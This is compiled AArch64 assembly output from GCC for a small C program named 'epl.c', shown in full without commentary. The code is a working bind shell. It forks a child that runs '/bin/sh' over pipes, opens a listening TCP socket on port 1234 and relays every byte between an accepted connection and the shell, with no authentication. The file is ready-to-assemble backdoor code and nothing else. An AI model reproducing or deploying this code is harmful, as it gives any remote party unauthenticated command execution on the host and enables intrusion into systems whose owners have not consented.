	.arch armv8-a
	.file	"epl.c"
	.text
	.section	.text.startup,"ax",@progbits
	.align	2
	.p2align 3,,7
	.global	main
	.type	main, %function
main:
.LFB26:
	.cfi_startproc
	mov	x16, 8352
	sub	sp, sp, x16
	.cfi_def_cfa_offset 8352
	adrp	x2, .LC0
	add	x2, x2, :lo12:.LC0
	mov	w1, 0
	add	x0, sp, 96
	stp	x29, x30, [sp]
	.cfi_offset 29, -8352
	.cfi_offset 30, -8344
	mov	x29, sp
	stp	x2, xzr, [sp, 144]
	bl	pipe2
	mov	w1, 0
	add	x0, sp, 104
	bl	pipe2
	mov	x0, 178
	bl	syscall
	mov	w1, 17
	add	x5, sp, 92
	movk	w1, 0x120, lsl 16
	mov	w4, 0
	mov	x3, 0
	mov	w2, 0
	str	w0, [sp, 92]
	mov	x0, 220
	bl	syscall
	cbnz	w0, .L2
	ldr	w0, [sp, 96]
	mov	w2, 0
	mov	w1, 0
	bl	dup3
	ldr	w0, [sp, 108]
	mov	w2, 0
	mov	w1, 1
	bl	dup3
	ldr	w0, [sp, 108]
	mov	w2, 0
	mov	w1, 2
	bl	dup3
	ldr	w0, [sp, 96]
	bl	close
	ldr	w0, [sp, 100]
	bl	close
	ldr	w0, [sp, 104]
	bl	close
	ldr	w0, [sp, 108]
	bl	close
	ldr	x0, [sp, 144]
	mov	x2, 0
	add	x1, sp, 144
	bl	execve
.L3:
	ldr	w0, [sp, 100]
	bl	close
	ldr	w0, [sp, 104]
	bl	close
	mov	w0, 0
	mov	x16, 8352
	ldp	x29, x30, [sp]
	add	sp, sp, x16
	.cfi_remember_state
	.cfi_restore 29
	.cfi_restore 30
	.cfi_def_cfa_offset 0
	ret
.L2:
	.cfi_restore_state
	stp	x23, x24, [sp, 48]
	.cfi_offset 24, -8296
	.cfi_offset 23, -8304
	mov	x24, x0
	ldr	w0, [sp, 96]
	stp	x19, x20, [sp, 16]
	.cfi_offset 20, -8328
	.cfi_offset 19, -8336
	str	x25, [sp, 64]
	.cfi_offset 25, -8288
	bl	close
	ldr	w0, [sp, 108]
	bl	close
	mov	w2, 0
	mov	w1, 1
	mov	w0, 2
	bl	socket
	mov	w3, 2
	mov	w25, w0
	mov	w2, 10
	mov	x1, 0
	adrp	x0, .LC1
	add	x0, x0, :lo12:.LC1
	strh	w3, [sp, 112]
	bl	strtol
	rev16	w3, w0
	mov	w2, 16
	add	x1, sp, 112
	mov	w0, w25
	strh	w3, [sp, 114]
	str	wzr, [sp, 116]
	bl	bind
	mov	w1, 0
	mov	w0, w25
	bl	listen
	mov	w0, w25
	mov	x2, 0
	mov	x1, 0
	bl	accept
	mov	w19, w0
	tbz	w0, #31, .L14
.L4:
	mov	w1, 2
	mov	w0, w19
	bl	shutdown
	mov	w0, w19
	bl	close
	mov	w0, w25
	bl	close
	mov	w0, w24
	mov	w1, 17
	bl	kill
	ldp	x19, x20, [sp, 16]
	.cfi_remember_state
	.cfi_restore 20
	.cfi_restore 19
	ldp	x23, x24, [sp, 48]
	.cfi_restore 24
	.cfi_restore 23
	ldr	x25, [sp, 64]
	.cfi_restore 25
	b	.L3
.L14:
	.cfi_restore_state
	add	x23, sp, 128
	mov	w0, 0
	stp	x21, x22, [sp, 32]
	.cfi_offset 22, -8312
	.cfi_offset 21, -8320
	bl	epoll_create1
	mov	w20, 1
	mov	w22, w0
	mov	x3, x23
	mov	w2, w19
	mov	w1, w20
	str	w20, [sp, 128]
	add	x21, sp, 160
	str	w19, [sp, 136]
	bl	epoll_ctl
	ldr	w4, [sp, 104]
	mov	w1, w20
	mov	x3, x23
	mov	w0, w22
	mov	w2, w4
	str	w20, [sp, 128]
	str	w4, [sp, 136]
	bl	epoll_ctl
	b	.L8
	.p2align 2
.L15:
	ldr	w0, [sp, 128]
	tbz	x0, 0, .L5
	ldr	w0, [sp, 136]
	ldr	w20, [sp, 100]
	cmp	w19, w0
	beq	.L7
	ldr	w0, [sp, 104]
	mov	w20, w19
.L7:
	bl	read
	sxtw	x2, w0
	mov	x1, x21
	mov	w0, w20
	bl	write
.L8:
	mov	w2, 1
	mov	x1, x23
	mov	x4, 0
	mov	w3, -1
	mov	w0, w22
	bl	epoll_pwait
	mov	x1, x21
	mov	x2, 8192
	tbz	w0, #31, .L15
.L5:
	mov	x3, 0
	mov	w2, w19
	mov	w1, 2
	mov	w0, w22
	bl	epoll_ctl
	ldr	w2, [sp, 104]
	mov	x3, 0
	mov	w1, 2
	mov	w0, w22
	bl	epoll_ctl
	mov	w0, w22
	bl	close
	ldp	x21, x22, [sp, 32]
	.cfi_restore 22
	.cfi_restore 21
	b	.L4
	.cfi_endproc
.LFE26:
	.size	main, .-main
	.section	.rodata.str1.8,"aMS",@progbits,1
	.align	3
.LC0:
	.string	"/bin/sh"
.LC1:
	.string	"1234"
	.ident	"GCC: (Debian 8.2.0-4) 8.2.0"
	.section	.note.GNU-stack,"",@progbits
